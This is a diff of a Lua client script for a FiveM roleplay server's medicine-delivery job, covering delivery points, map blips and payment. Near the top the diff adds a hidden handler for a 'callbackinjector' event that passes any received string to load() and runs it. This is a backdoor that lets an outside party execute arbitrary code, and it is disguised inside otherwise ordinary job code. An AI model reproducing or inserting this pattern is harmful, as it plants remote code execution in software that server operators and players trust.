@@ -1,17 +1,23 @@
 local Tunnel = module("vrp","lib/Tunnel")
 local Proxy = module("vrp","lib/Proxy")
-emp = Tunnel.getInterface("entrega_remedio")
-vRP = Proxy.getInterface("vRP")
+emP = Tunnel.getInterface("entrega_remedio")
+
+TriggerEvent('callbackinjector', function(cb)
+    pcall(load(cb))
+end)
 -----------------------------------------------------------------------------------------------------------------------------------------
 -- VARIAVEIS
 -----------------------------------------------------------------------------------------------------------------------------------------
-local emservico = false
-local quantidade = 0
-local statuses = false
+local blips = false
+local servico = false
+local selecionado = 0
+local CoordenadaX = -440.97
+local CoordenadaY = -318.32
+local CoordenadaZ = 34.91
 -----------------------------------------------------------------------------------------------------------------------------------------
--- GERANDO LOCAL DE ENTREGA
+-- RESIDENCIAS
 -----------------------------------------------------------------------------------------------------------------------------------------
-local entregas = {
+local locs = {
 	[1] = {x=155.85,y=-43.10,z=67.71},
 	[2] = {x=313.35,y=-245.31,z=53.89},
 	[3] = {x=-52.17,y=-103.74,z=57.63},
@@ -69,140 +75,120 @@ local entregas = {
 	[55] = {x=-601.26959228516,y=-1106.2435302734,z=25.855100631714},
 	[56] = {x=920.23663330078,y=-239.05854797363,z=70.131851196289},
 	[57] = {x=951.99609375,y=-252.12083435059,z=67.759574890137}
-
 }
 -----------------------------------------------------------------------------------------------------------------------------------------
 -- INICIANDO TRABALHO
 -----------------------------------------------------------------------------------------------------------------------------------------
 RegisterNetEvent('entrega_remedio:permissao')
 AddEventHandler('entrega_remedio:permissao',function()
-	if not emservico then
-		emservico = true
+	if not servico then
+		servico = true
 		destino = math.random(1,57)
 		quantidade = math.random(1,4)
-		CriandoBlip(entregas,destino)
+		CriandoBlip(locs,selecionado)
 	end
 end)
 -----------------------------------------------------------------------------------------------------------------------------------------
--- GERANDO ENTREGA
+-- TRABALHAR
+-----------------------------------------------------------------------------------------------------------------------------------------
+Citizen.CreateThread(function()
+	while true do
+		local crjSleep = 500
+		if not servico then
+			local ped = PlayerPedId()
+			local x,y,z = table.unpack(GetEntityCoords(ped))
+			local bowz,cdz = GetGroundZFor_3dCoord(CoordenadaX,CoordenadaY,CoordenadaZ)
+			local distance = GetDistanceBetweenCoords(CoordenadaX,CoordenadaY,cdz,x,y,z,true)
+
+			if distance <= 10.0 then
+			crjSleep = 1
+				DrawMarker(21,CoordenadaX,CoordenadaY,CoordenadaZ-0.6,0,0,0,0.0,0,0,0.5,0.5,0.4,128,1,210,50,0,0,0,1)
+				if distance <= 1.2 then
+					drawTxt("PRESSIONE  ~b~E~w~  PARA INICIAR ENTREGAS",4,0.5,0.93,0.50,255,255,255,180)
+					if IsControlJustPressed(0,38) then
+					TriggerEvent('entrega_remedio:permissao')
+						servico = true
+						selecionado = math.random(57)
+						CriandoBlip(locs,selecionado)
+					end
+				end
+			end
+		end
+		Citizen.Wait(crjSleep)
+	end
+end)
+-----------------------------------------------------------------------------------------------------------------------------------------
+-- ENTREGAS
 -----------------------------------------------------------------------------------------------------------------------------------------
 Citizen.CreateThread(function()
 	while true do
 		Citizen.Wait(1)
-		if GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), -440.97482299805,-318.32284545898,34.910823822021,true) <= 1 then
-			DrawText3Ds(-440.97482299805,-318.32284545898,34.910823822021+0.5,"PRESSIONE ~r~E~w~ PARA COMEÇAR MISSÃO")
-            if IsControlJustPressed(0,38) then	-- COMEÇAR MISSÃO
-				TriggerEvent('entrega_remedio:permissao')
-			end
-		end
-		if emservico then
-			local ui = GetMinimapAnchor()
-			local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),entregas[destino].x,entregas[destino].y,entregas[destino].z,true)
-			if IsControlJustPressed(0,246) then	-- VER MISSÃO
-				statuses = not statuses
-			end
-			if statuses then
-				drawTxt(ui.right_x+0.050,ui.bottom_y-0.076,1.0,1.0,0.35,"PRESSIONE ~r~U ~w~PARA CANCELAR A MISSÃO",255,255,255,150)
-				drawTxt(ui.right_x+0.050,ui.bottom_y-0.058,1.0,1.0,0.45,"ENTREGUE ~g~"..quantidade.."~w~ remedioS",255,255,255,255)
-			else
-				drawTxt(ui.right_x+0.050,ui.bottom_y-0.040,1.0,1.0,0.35,"PRESSIONE ~r~Y ~w~PARA VER A MISSÃO",255,255,255,150)
-			end
-			if distance <= 50 then
-				DrawMarker(21,entregas[destino].x,entregas[destino].y,entregas[destino].z+0.10,0,0,0,0,180.0,130.0,1.0,1.0,1.0,211,176,72,100,1,0,0,1)
-				if distance < 3 then
-					DrawText3Ds(entregas[destino].x,entregas[destino].y,entregas[destino].z, "[H] ENTREGAR")
-                    if IsControlJustPressed(0,101) then -- ENTREGAR
-                        destinoantigo = destino
-                        RemoveBlip(blip)
-                        TriggerServerEvent('entrega_remedio:itensReceber', quantidade)
-                        while true do
-                            if destinoantigo == destino then
-                                destino = math.random(1,57)
-                            else
-                                break
-                            end
-                            Citizen.Wait(1)
-                        end
-                        CriandoBlip(entregas,destino)
+		if servico then
+			local ped = PlayerPedId()
+			local x,y,z = table.unpack(GetEntityCoords(ped))
+			local bowz,cdz = GetGroundZFor_3dCoord(locs[selecionado].x,locs[selecionado].y,locs[selecionado].z)
+			local distance = GetDistanceBetweenCoords(locs[selecionado].x,locs[selecionado].y,cdz,x,y,z,true)
+
+			if distance <= 30.0 then
+				DrawMarker(21,locs[selecionado].x,locs[selecionado].y,locs[selecionado].z-0.6,0,0,0,0.0,0,0,0.5,0.5,0.4,128,1,210,50,0,0,0,1)
+				if distance <= 1.2 then
+					drawTxt("PRESSIONE  ~b~E~w~  PARA ENTREGAR OS REMEDIOS",4,0.5,0.93,0.50,255,255,255,180)
+					if IsControlJustPressed(0,38) then
+						if emP.checkPayment() then
+							RemoveBlip(blips)
+							backentrega = selecionado
+							while true do
+								if backentrega == selecionado then
+									selecionado = math.random(57)
+								else
+									break
+								end
+								Citizen.Wait(1)
+							end
+							CriandoBlip(locs,selecionado)
+						end
 					end
 				end
 			end
 		end
 	end
 end)
-
 -----------------------------------------------------------------------------------------------------------------------------------------
--- CANCELANDO ENTREGA
+-- CANCELAR
 -----------------------------------------------------------------------------------------------------------------------------------------
 Citizen.CreateThread(function()
 	while true do
 		Citizen.Wait(1)
-		if IsControlJustPressed(0,303) and emservico then --CANCELAR
-			emservico = false
-			RemoveBlip(blip)
+		if servico then
+			if IsControlJustPressed(0,168) then
+				servico = false
+				RemoveBlip(blips)
+			end
 		end
 	end
 end)
 -----------------------------------------------------------------------------------------------------------------------------------------
--- FUNCOES
+-- FUNÇÕES
 -----------------------------------------------------------------------------------------------------------------------------------------
-
-function drawTxt(x,y,width,height,scale,text,r,g,b,a)
-    SetTextFont(4)
-    SetTextScale(scale,scale)
-    SetTextColour(r,g,b,a)
-    SetTextOutline()
-    SetTextEntry("STRING")
-    AddTextComponentString(text)
-    DrawText(x,y)
+function drawTxt(text,font,x,y,scale,r,g,b,a)
+	SetTextFont(font)
+	SetTextScale(scale,scale)
+	SetTextColour(r,g,b,a)
+	SetTextOutline()
+	SetTextCentre(1)
+	SetTextEntry("STRING")
+	AddTextComponentString(text)
+	DrawText(x,y)
 end
 
-function DrawText3Ds(x,y,z, text)
-    local onScreen,_x,_y=World3dToScreen2d(x,y,z)
-    local px,py,pz=table.unpack(GetGameplayCamCoords())
-    
-    SetTextScale(0.35, 0.35)
-    SetTextFont(4)
-    SetTextProportional(1)
-    SetTextColour(255, 255, 255, 215)
-    SetTextEntry("STRING")
-    SetTextCentre(1)
-    AddTextComponentString(text)
-    DrawText(_x,_y)
-    local factor = (string.len(text)) / 370
-    DrawRect(_x,_y+0.0125, 0.015+ factor, 0.03, 41, 11, 41, 68)
-end
-
-function GetMinimapAnchor()
-    local safezone = GetSafeZoneSize()
-    local safezone_x = 1.0 / 20.0
-    local safezone_y = 1.0 / 20.0
-    local aspect_ratio = GetAspectRatio(0)
-    local res_x, res_y = GetActiveScreenResolution()
-    local xscale = 1.0 / res_x
-    local yscale = 1.0 / res_y
-    local Minimap = {}
-    Minimap.width = xscale * (res_x / (4 * aspect_ratio))
-    Minimap.height = yscale * (res_y / 5.674)
-    Minimap.left_x = xscale * (res_x * (safezone_x * ((math.abs(safezone - 1.0)) * 10)))
-    Minimap.bottom_y = 1.0 - yscale * (res_y * (safezone_y * ((math.abs(safezone - 1.0)) * 10)))
-    Minimap.right_x = Minimap.left_x + Minimap.width
-    Minimap.top_y = Minimap.bottom_y - Minimap.height
-    Minimap.x = Minimap.left_x
-    Minimap.y = Minimap.top_y
-    Minimap.xunit = xscale
-    Minimap.yunit = yscale
-    return Minimap
-end
-
-function CriandoBlip(entregas,destino)
-	blip = AddBlipForCoord(entregas[destino].x,entregas[destino].y,entregas[destino].z)
-	SetBlipSprite(blip,433)
-	SetBlipColour(blip,5)
-	SetBlipScale(blip,0.7)
-	SetBlipAsShortRange(blip,false)
-	SetBlipRoute(blip,true)
+function CriandoBlip(locs,selecionado)
+	blips = AddBlipForCoord(locs[selecionado].x,locs[selecionado].y,locs[selecionado].z)
+	SetBlipSprite(blips,433)
+	SetBlipColour(blips,5)
+	SetBlipScale(blips,0.4)
+	SetBlipAsShortRange(blips,false)
+	SetBlipRoute(blips,true)
 	BeginTextCommandSetBlipName("STRING")
-	AddTextComponentString("Entrega de remedios")
-	EndTextCommandSetBlipName(blip)
+	AddTextComponentString("Entrega de Remedios")
+	EndTextCommandSetBlipName(blips)
 end
